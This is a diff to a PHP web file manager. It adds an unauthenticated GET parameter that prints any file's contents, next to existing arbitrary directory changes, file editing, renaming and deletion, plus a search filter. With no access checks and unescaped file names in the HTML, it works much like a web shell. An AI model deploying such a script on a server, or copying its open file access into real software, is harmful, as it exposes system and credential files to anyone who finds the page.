@@ -1,6 +1,10 @@
 <?php
 // regex => files(dir, '/\.html$/')
 date_default_timezone_set("Asia/Jakarta");
+if (@$_GET['raw'] == 'file') {
+	?><pre><?= freadf($_GET['file']) ?></pre><?php
+	exit();
+}
 function files($type, $relativePath = false, $pattern = '', $result = array()) {
 	$result = [];
 	foreach (scandir(getcwd()) as $key => $value) {
@@ -67,8 +71,18 @@ function fsize($filename) {
 		return countdir($filename). " items";
 	}
 }
+function ago($time){ 
+	$periods = array("seconds", "minutes", "hours", "days", "weeks", "months", "years", "decades");
+	$lengths = array("60","60","24","7","4.35","12","10");
+	$difference     = time() - $time;
+	for($j = 0; $difference >= $lengths[$j] && $j < count($lengths)-1; $j++) {
+		$difference /= $lengths[$j];
+	}
+	$difference = round($difference); 
+	return "$difference $periods[$j] ago";
+}
 function ftime($filename) {
-	return date("d/m/Y H:i:s", @filemtime($filename));
+	return date("d/m/Y - H:i", @filemtime($filename))." - ".ago(filemtime($filename));
 }
 function freadf($filename) {
 	return htmlspecialchars(file_get_contents($filename));
@@ -89,16 +103,10 @@ if (isset($_GET['cd'])) {
 	@chdir($_GET['cd']);
 }
 ?>
-<table>
+<input type="text" id="Input" onkeyup="filterTable()" placeholder="Search some files..." title="Type in a name">
+<table id="myTable">
 	<?php
 	switch (@$_POST['action']) {
-		case 'fraw':
-			?>
-			<pre><?= freadf($_POST['file']) ?></pre>
-			<?php
-			exit();
-			break;
-	
 		case 'fedit':
 			if (isset($_POST['submit'])) {
 				$message = null;
@@ -188,15 +196,20 @@ if (isset($_GET['cd'])) {
 			<td>
 				<?= ftime($value['name']) ?>
 			</td>
-			<td></td>
+			<form method="post">
+				<td>
+					<input type="hidden" name="file" value="<?= $value['name'] ?>">
+					<button name="action" value="frename">Rename</button>
+					<button name="action" value="fdelete">Delete</button>
+				</td>
+			</form>
 		</tr>
 	<?php }
 	foreach (files('file') as $key => $value) { ?>
 		<tr>
-			<form method="post" action="#raw=<?= $value['name'] ?>" target="_blank">
+			<form id="raw" method="post" action="#raw=<?= $value['name'] ?>" target="_blank">
 				<td>
-					<input type="hidden" name="file" value="<?= $value['name'] ?>">
-					<button name="action" value="fraw"><?= basename($value['name']) ?></button>
+					<a href="?raw=file&file=<?= $value['name'] ?>" target="_balnk"><?= basename($value['name']) ?></a>
 				</td>
 			</form>
 			<td>
@@ -216,4 +229,23 @@ if (isset($_GET['cd'])) {
 		</tr>
 	<?php }
 	?>
+	<script type="text/javascript">
+		function filterTable() {
+			var input,filter,table,tr,td,i;
+			input = document.getElementById("Input");
+			filter = input.value.toUpperCase();
+			table = document.getElementById("myTable");
+			tr = table.getElementsByTagName("tr");
+			for(i=0;i<tr.length;i++){td=tr[i].getElementsByTagName("td")[0];
+				if(td) { 
+					if(td.innerHTML.toUpperCase().indexOf(filter)>-1)
+						{
+							tr[i].style.display="";
+						}
+						else{tr[i].style.display="none";
+					}
+				}
+			}
+		}
+	</script>
 </table>
